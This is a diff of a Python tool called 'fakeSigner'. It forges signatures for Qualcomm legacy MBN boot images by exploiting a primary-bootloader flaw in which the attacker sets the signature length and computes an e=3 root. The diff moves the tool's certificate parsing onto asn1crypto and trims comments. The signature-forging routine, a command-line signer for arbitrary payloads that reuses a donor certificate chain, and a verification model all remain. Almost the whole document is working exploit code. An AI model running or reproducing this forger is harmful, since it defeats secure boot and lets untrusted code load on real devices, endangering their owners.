@@ -3,6 +3,8 @@
 legacy MBN fakeSigner -- forges legacy MBN signatures by abusing the
 Qualcomm PBL short-signature bug (attacker-controlled SignatureLength).
 
+Requires: asn1crypto  (pip install asn1crypto)
+
 Layout follows TalAloni/QualcommSecureBoot-SecondaryExecutableVerifier:
   80-byte (0x50) header, little-endian
     0x00 CodeWord  D1 DC 4B 84
@@ -33,114 +35,38 @@ import math
 import os
 import secrets
 import sys
+from datetime import datetime, timezone
 
-# ------------------------------------------------------------------ DER ----
-
-def _der_len(buf, off):
-    """Return (value_start, value_end, next_offset)."""
-    if off + 2 > len(buf):
-        raise ValueError("truncated DER at %d" % off)
-    l = buf[off + 1]
-    p = off + 2
-    if l & 0x80:
-        nb = l & 0x7F
-        if nb == 0 or p + nb > len(buf):
-            raise ValueError("unsupported DER length at %d" % off)
-        l = int.from_bytes(buf[p:p + nb], "big")
-        p += nb
-    return p, p + l, l
-
-
-def _der_walk(buf, start, end, depth=0):
-    """Yield (tag, vstart, vend)."""
-    off = start
-    while off < end:
-        tag = buf[off]
-        vs, ve, _l = _der_len(buf, off)
-        if ve > end:
-            return
-        yield tag, vs, ve
-        off = ve
-
-
-def _len_enc(n):
-    if n < 0x80:
-        return bytes([n])
-    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
-    return bytes([0x80 | len(b)]) + b
-
-
-def tlv(tag, content):
-    return bytes([tag]) + _len_enc(len(content)) + content
+from asn1crypto import x509 as asn1x509
+from asn1crypto import keys as asn1keys
+from asn1crypto import core as asn1core
+from asn1crypto import algos as asn1algos
 
 
 # ----------------------------------------------------------------- X509 ----
 
 def x509_pubkey(cert):
-    """Extract the RSA public key (n, e) from an X.509 DER blob. No third-party deps."""
-    t, vs, ve = next(_der_walk(cert, 0, len(cert)))
-    if t != 0x30:
-        raise ValueError("cert is not a SEQUENCE")
-
-    def _find_spki(start, end, depth=0):
-        for tag, s, e in _der_walk(cert, start, end):
-            if tag == 0x30:
-                if depth >= 1 and _contains_bitstring(s, e):
-                    return s, e
-                r = _find_spki(s, e, depth + 1)
-                if r:
-                    return r
-        return None
-
-    def _contains_bitstring(s, e):
-        return any(tt == 0x03 for tt, _, _ in _der_walk(cert, s, e))
-
-    spki = _find_spki(vs, ve)
-    if spki is None:
-        raise ValueError("no SubjectPublicKeyInfo found")
-    s, e = spki
-    for tag, bs, be in _der_walk(cert, s, e):
-        if tag == 0x03:                       # BIT STRING; first byte is the unused-bit count
-            inner = cert[bs + 1:be]
-            it, ivs, ive = next(_der_walk(inner, 0, len(inner)))
-            if it != 0x30:
-                continue
-            ints = [inner[a:b] for tg, a, b in _der_walk(inner, ivs, ive) if tg == 0x02]
-            if len(ints) >= 2:
-                n = int.from_bytes(ints[0], "big")
-                e_ = int.from_bytes(ints[1], "big")
-                return n, e_
-    raise ValueError("no RSA key in SPKI")
+    """Extract RSA (n, e) from an X.509 DER blob via asn1crypto."""
+    c = asn1x509.Certificate.load(cert)
+    if c.public_key.algorithm != "rsa":
+        raise ValueError("not an RSA certificate: %s" % c.public_key.algorithm)
+    nums = c.public_key["public_key"].parsed
+    return int(nums["modulus"].native), int(nums["public_exponent"].native)
 
 
 def x509_strings(cert):
-    """Collect printable strings in the cert (eyeball SW_ID / HW_ID / hash OU)."""
+    """Collect printable strings in the subject name (SW_ID / HW_ID / hash OU)."""
+    c = asn1x509.Certificate.load(cert)
     out = []
-
-    def walk(s, e, d=0):
-        for tag, a, b in _der_walk(cert, s, e):
-            if tag in (0x13, 0x0C, 0x16, 0x14, 0x1E):
-                try:
-                    out.append(cert[a:b].decode("ascii"))
-                except UnicodeDecodeError:
-                    pass
-            elif tag in (0x30, 0x31) and d < 8:
-                walk(a, b, d + 1)
-
-    _t, vs, ve = next(_der_walk(cert, 0, len(cert)))
-    walk(vs, ve)
+    for rdn in c.subject.chosen:
+        for attr in rdn:
+            try:
+                v = attr["value"].native
+            except Exception:
+                continue
+            if isinstance(v, str):
+                out.append(v)
     return out
-
-
-_OID_SHA256RSA = bytes.fromhex("2A864886F70D01010B")
-_OID_RSA = bytes.fromhex("2A864886F70D010101")
-_OID_CN = bytes.fromhex("550403")
-_OID_OU = bytes.fromhex("55040B")
-
-
-def _int_der(x):
-    b = x.to_bytes((x.bit_length() + 8) // 8 or 1, "big")
-    return tlv(0x02, b)
 
 
 def pkcs1_v15_sign(n, d, digest, algo="sha256"):
@@ -159,16 +85,43 @@ def pkcs1_v15_sign(n, d, digest, algo="sha256"):
 
 def build_selfsigned(n, e, d, ou=b"07 0001 SHA256", cn=b"FAKE SIGNER TEST"):
     """Build a self-signed e=3 certificate to serve as the selftest donor."""
-    name = tlv(0x30, tlv(0x31, tlv(0x30, tlv(0x06, _OID_CN) + tlv(0x13, cn))
-                          + tlv(0x30, tlv(0x06, _OID_OU) + tlv(0x13, ou))))
-    algid = tlv(0x30, tlv(0x06, _OID_SHA256RSA) + tlv(0x05, b""))
-    spki = tlv(0x30, tlv(0x30, tlv(0x06, _OID_RSA) + tlv(0x05, b""))
-                     + tlv(0x03, b"\x00" + tlv(0x30, _int_der(n) + _int_der(e))))
-    validity = tlv(0x30, tlv(0x17, b"200101000000Z") + tlv(0x17, b"300101000000Z"))
-    tbs = tlv(0x30, tlv(0xA0, _int_der(2)) + _int_der(1) + algid
-                    + name + validity + name + spki)
-    sig = pkcs1_v15_sign(n, d, hashlib.sha256(tbs).digest())
-    return tlv(0x30, tbs + algid + tlv(0x03, b"\x00" + sig))
+    ou_s = ou.decode() if isinstance(ou, bytes) else ou
+    cn_s = cn.decode() if isinstance(cn, bytes) else cn
+
+    name = asn1x509.Name.build({
+        "common_name": cn_s,
+        "organizational_unit_name": ou_s,
+    })
+    pub_info = asn1keys.PublicKeyInfo({
+        "algorithm": asn1keys.PublicKeyAlgorithm({
+            "algorithm": "rsa",
+            "parameters": asn1core.Null(),
+        }),
+        "public_key": asn1keys.RSAPublicKey({
+            "modulus": n,
+            "public_exponent": e,
+        }),
+    })
+    sig_alg = asn1algos.SignedDigestAlgorithm({"algorithm": "sha256_rsa"})
+    tbs = asn1x509.TbsCertificate({
+        "version": "v3",
+        "serial_number": 2,
+        "signature": sig_alg,
+        "issuer": name,
+        "validity": asn1x509.Validity({
+            "not_before": asn1x509.Time({"utc_time": datetime(2020, 1, 1)}),
+            "not_after": asn1x509.Time({"utc_time": datetime(2030, 1, 1)}),
+        }),
+        "subject": name,
+        "subject_public_key_info": pub_info,
+    })
+    sig = pkcs1_v15_sign(n, d, hashlib.sha256(tbs.dump()).digest())
+    cert = asn1x509.Certificate({
+        "tbs_certificate": tbs,
+        "signature_algorithm": sig_alg,
+        "signature_value": asn1core.OctetBitString(sig),
+    })
+    return cert.dump()
 
 
 # ------------------------------------------------------------------ MBN ----
@@ -204,7 +157,6 @@ class MbnHeader:
     def _set_u32(self, off, v):
         self.raw[off:off + 4] = int(v).to_bytes(4, "little")
 
-    # fields
     image_type = property(lambda s: s._u32(0x08))
     header_size = property(lambda s: s._u32(0x14))
     load_addr = property(lambda s: s._u32(0x18))
@@ -233,7 +185,6 @@ class MbnHeader:
             self._set_u32(0x1C, body_size)
 
     def file_off(self, mem_addr):
-        """Memory address -> file offset. The body starts at base+header_size and maps onto load_addr."""
         hs = self.header_size or HEADER_LEN
         return self.base + hs + mem_addr - self.load_addr
 
@@ -276,7 +227,6 @@ def detect_hash(cert):
 
 
 def image_digest(header_bytes, code, key1, key2, algo="sha256"):
-    """D1/D2/D3; key1 is the inner 0x36 key, key2 the outer 0x5c key."""
     h = (lambda b: hashlib.sha256(b).digest()) if algo == "sha256" \
         else (lambda b: hashlib.sha1(b).digest())
     d1 = h(bytes(header_bytes) + bytes(code))
@@ -288,11 +238,6 @@ def image_digest(header_bytes, code, key1, key2, algo="sha256"):
 # ------------------------------------------------- PBL verification model ----
 
 def pbl_verify_signature(modulus, exponent, signature, digest, strict=False):
-    """
-    Replicates auth_verify_signature(). The internal result buffer is
-    little-endian, so v68[:hash_len] holds the low-order bytes of the integer,
-    i.e. the digest reversed.
-    """
     mod_len, exp_len, sig_len = len(modulus), len(exponent), len(signature)
     hl = len(digest)
 
@@ -348,11 +293,6 @@ FAIL = {1046: "length sanity check", 1070: "exponent not in {3,65537}",
 
 
 def audit(buf):
-    """
-    Independently re-derives everything from the file on disk and checks that
-    the header length/address fields are self-consistent. These are the fields
-    most easily got wrong when transplanting code, so they get their own audit.
-    """
     probs = []
     hdr = MbnHeader.read(buf)
     if hdr is None:
@@ -383,13 +323,6 @@ def audit(buf):
         probs.append("CertAddress 0x%x != SigAddr 0x%x + SigLen %d (= 0x%x)" % (
             hdr.cert_addr, hdr.sig_addr, hdr.sig_len, hdr.sig_addr + hdr.sig_len))
 
-    # The PBL walks the signature and the certificate store word-wise, and
-    # CertAddress is SigAddress + SigLength. So a SigLength that is not a
-    # multiple of 4 pushes the certificate store off alignment. Real devices
-    # reject the image before verification ever runs -- observed on MSM8612 as
-    # a Sahara error right after the header lands, for L in {46, 53} but not
-    # for L = 60. Keep this check: it is the difference between an image the
-    # model calls ACCEPTED and one a device will actually load.
     for name, addr in (("SigAddress", hdr.sig_addr), ("CertAddress", hdr.cert_addr)):
         if addr % 4:
             probs.append("%s 0x%x is not 4-byte aligned -- the PBL indexes these "
@@ -412,23 +345,17 @@ def audit(buf):
 # ---------------------------------------------------------------- forging ----
 
 def forge(n, e, digest, L):
-    """Build an L-byte PKCS#1 v1.5 window and take its e-th root modulo 2^(8L)."""
     hl = len(digest)
-    # The PBL indexes words via (L>>2); the top word it actually checks is
-    # buf[align-4 .. align-1] with align = 4*(L>>2). So when L is not a multiple
-    # of 4, up to 3 bytes at the very top are never looked at -- there is no
-    # need to force L to be a multiple of 4.
     align = 4 * (L >> 2)
     if align - 4 < hl + 1:
         return None, "L=%d cannot hold a %d-byte digest plus separator" % (L, hl)
 
     buf = bytearray(L)
-    buf[0:hl] = digest[::-1]           # digest goes at the low-order end
-    buf[hl] = 0x00                     # separator
+    buf[0:hl] = digest[::-1]
+    buf[hl] = 0x00
     for i in range(hl + 1, align - 4):
         buf[i] = 0xFF
-    buf[align - 4] = 0xFF              # top word; reads as 0x0001FFFF little-endian,
-                                       # i.e. the EM prefix 00 01 FF FF
+    buf[align - 4] = 0xFF
     buf[align - 3] = 0xFF
     buf[align - 2] = 0x01
     buf[align - 1] = 0x00
@@ -440,7 +367,7 @@ def forge(n, e, digest, L):
         return None, "e is even"
 
     k = 8 * L
-    d = pow(e, -1, 1 << (k - 1))       # |(Z/2^k)^*| = 2^(k-1)
+    d = pow(e, -1, 1 << (k - 1))
     s = pow(T, d, 1 << k)
     if pow(s, e, 1 << k) != T:
         return None, "e-th root self-check failed"
@@ -456,10 +383,18 @@ def forge(n, e, digest, L):
 # -------------------------------------------------------------------- CLI ----
 
 def parse_hex8(s, what):
-    b = bytes.fromhex(s.replace(" ", "").replace("0x", ""))
-    if len(b) != 8:
-        raise SystemExit("%s must be 8 bytes of hex (16 hex characters)" % what)
-    return b
+    raw = s
+    s = s.strip().replace(" ", "").replace("_", "")
+    if s[:2].lower() == "0x":
+        s = s[2:]
+    if len(s) != 16:
+        raise SystemExit(
+            "%s must be 8 bytes of hex (16 hex characters); got %r (%d hex chars)"
+            % (what, raw, len(s)))
+    try:
+        return bytes.fromhex(s)
+    except ValueError:
+        raise SystemExit("%s is not valid hex: %r" % (what, raw))
 
 
 def _keygen(bits=2048, e=3):
@@ -540,7 +475,6 @@ def _int_auto(s):
 
 
 def cmd_sign(a):
-    # ---- target image (supplies the code) ----
     if a.payload and a.payload_mbn:
         raise SystemExit(
             "--payload and --payload-mbn are mutually exclusive.\n"
@@ -554,7 +488,7 @@ def cmd_sign(a):
         if thdr is None:
             raise SystemExit("payload-mbn is not a legacy MBN")
         if not a.donor:
-            a.donor = a.payload_mbn          # pure re-sign: reuse its own cert chain
+            a.donor = a.payload_mbn
     if not a.donor:
         raise SystemExit("need --donor (supplies the cert chain) or --payload-mbn")
 
@@ -568,10 +502,6 @@ def cmd_sign(a):
     idx = min(a.leaf_index, len(certs) - 1)
     n, e = x509_pubkey(certs[idx])
 
-    # Keep the cert store verbatim (including any padding after the last cert);
-    # only the parse result is used, to grab the leaf public key. Re-joining the
-    # parsed certs would drop that padding -- harmless for the digest, but it
-    # would make the output differ from the original image.
     coff = hdr.file_off(hdr.cert_addr)
     cert_store = donor[coff:coff + hdr.cert_len]
     joined = len(b"".join(certs))
@@ -587,11 +517,9 @@ def cmd_sign(a):
     if e != 3:
         raise SystemExit("leaf exponent e=%d; short-signature forgery is not feasible (need e=3)" % e)
 
-    # ---- code ----
     if a.payload:
         with open(a.payload, "rb") as f:
             blob = f.read()
-
         check = MbnHeader.read(blob)
         if check is not None:
             raise SystemExit(
@@ -602,7 +530,6 @@ def cmd_sign(a):
                 "Use --payload-mbn %s instead: it extracts only the code segment."
                 % (a.payload, check.base, check.image_type,
                    check.code_size, check.body_size, a.payload))
-
         code = bytearray(blob)
         print("[+] payload: raw file %s (%d bytes)" % (a.payload, len(code)))
     elif thdr is not None:
@@ -623,7 +550,6 @@ def cmd_sign(a):
         code.append(0)
     code = bytes(code)
 
-    # ---- header template and load address ----
     use_target_header = (a.header_from == "auto" and thdr is not None) \
         or a.header_from == "payload"
     hb_hdr, hb_buf = (thdr, tbuf) if (use_target_header and thdr) else (hdr, donor)
@@ -652,21 +578,15 @@ def cmd_sign(a):
         algo = detect_hash(certs[idx])
     print("[+] digest algorithm: %s" % algo)
 
-    key1 = parse_hex8(a.key1, "key1") if a.key1 else \
-        parse_hex8(a.sw_id, "sw-id")
-    key2 = parse_hex8(a.key2, "key2") if a.key2 else \
-        parse_hex8(a.hw_id, "hw-id")
+    key1 = parse_hex8(a.key1, "key1") if a.key1 else parse_hex8(a.sw_id, "sw-id")
+    key2 = parse_hex8(a.key2, "key2") if a.key2 else parse_hex8(a.hw_id, "hw-id")
     print("[+] i_key(0x36) = %s" % key1.hex())
     print("[+] o_key(0x5c) = %s" % key2.hex())
 
     max_L = n.bit_length() // (8 * e)
-    # Sweep starts at 44 because RFC 8017 asks for >= 8 0xFF bytes. The PBL
-    # itself only demands 5, so L >= 40 also works -- pass --L 40 to squeeze.
     if a.L:
         cands = [a.L]
     elif a.any_L:
-        # L that is not a multiple of 4 leaves CertAddress = SigAddr + L
-        # unaligned. The model accepts it; hardware has not. Explicit opt-in.
         cands = list(range(40, max_L + 1))
     else:
         cands = [x for x in range(44, max_L + 1) if x % 4 == 0]
@@ -720,7 +640,6 @@ def cmd_sign(a):
 
 
 def cmd_verify(a):
-    """Independent re-verification: re-derives everything from the file, trusting no intermediate value produced by the signing run."""
     buf = open(a.mbn, "rb").read()
     probs, hdr = audit(buf)
     print("[+] header")
@@ -792,9 +711,8 @@ def cmd_selftest(a):
     hdr = MbnHeader(b"\x00" * HEADER_LEN, 0)
     hdr.raw[0:4] = CODEWORD
     hdr.raw[4:8] = MAGIC
-    hdr._set_u32(0x08, 0x15)            # SBL1
+    hdr._set_u32(0x08, 0x15)
     hdr._set_u32(0x14, HEADER_LEN)
-    donor = bytes(hdr.raw) + payload + b"\x00" * 256 + cert
     hdr.set(load_addr=load, code_size=len(payload),
             sig_addr=load + len(payload), sig_len=256,
             cert_addr=load + len(payload) + 256, cert_len=len(cert),
@@ -818,14 +736,12 @@ def cmd_selftest(a):
     a.L = a.L
     a.any_L = False
     a.code_pad = 0
-    # overwrite with a fresh payload, to prove this signs *any* image
     pl = os.path.join(os.path.dirname(tmp), "_selftest_payload.bin")
     open(pl, "wb").write(b"\xde\xad\xbe\xef" * 64 + b"arbitrary image" * 4)
     a.payload = pl
     print("[+] donor written to %s" % tmp)
     rc = cmd_sign(a)
 
-    # run the --payload-mbn re-sign path too, to exercise the transplant entry
     print("\n" + "=" * 72)
     print("[+] re-sign path check: feed the forged MBN back in as --payload-mbn")
     print("=" * 72)
